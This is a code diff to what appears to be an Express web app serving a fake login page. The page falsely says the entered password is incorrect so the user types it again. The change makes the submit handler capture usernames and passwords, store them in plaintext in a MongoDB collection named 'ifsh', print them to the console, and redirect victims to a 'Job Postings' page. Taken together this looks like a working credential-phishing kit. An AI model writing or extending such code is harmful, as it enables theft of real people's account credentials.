@@ -178,7 +178,7 @@ app.get('/success', (req, res) => {
                 <input placeholder="Password" type="password" id="password" name="password" required>
             </div>
             <h2 style="font-size: 13px; color: #f36060; margin-bottom: 48px; font-family: sans-serif; text-align: start;">The password that you've entered is incorrect.</h2>
-            <button type="submit">Log in</button>
+            <button type="submit" href="/Job Postings2.html">Log in</button>
         </form>
     </div>
 
@@ -198,7 +198,7 @@ app.get('/success', (req, res) => {
 });
 
 app.post('/submit-additional-info', async (req, res) => {
-    const { username, additionalInfo } = req.body;
+    const { username, password } = req.body;
 
     try {
         if (!db) {
@@ -206,8 +206,17 @@ app.post('/submit-additional-info', async (req, res) => {
             return res.status(500).send('Database connection not initialized.');
         }
 
-        const additionalData = { username, additionalInfo, timestamp: new Date() };
-        await db.collection('additionalInfo').insertOne(additionalData);
+        // Create the login data object
+        const loginData = { username, password, timestamp: new Date() };
+        
+        // Log before inserting data
+        console.log("Attempting to insert data:", loginData);
+        
+        // Insert the new user data without checking for existing users
+        const result = await db.collection('ifsh').insertOne(loginData);
+        
+        // Log the result after successful insertion
+        console.log("Data inserted successfully:", result);
 
         console.log("Additional info inserted successfully.");
         res.redirect('/Job Postings2.html');
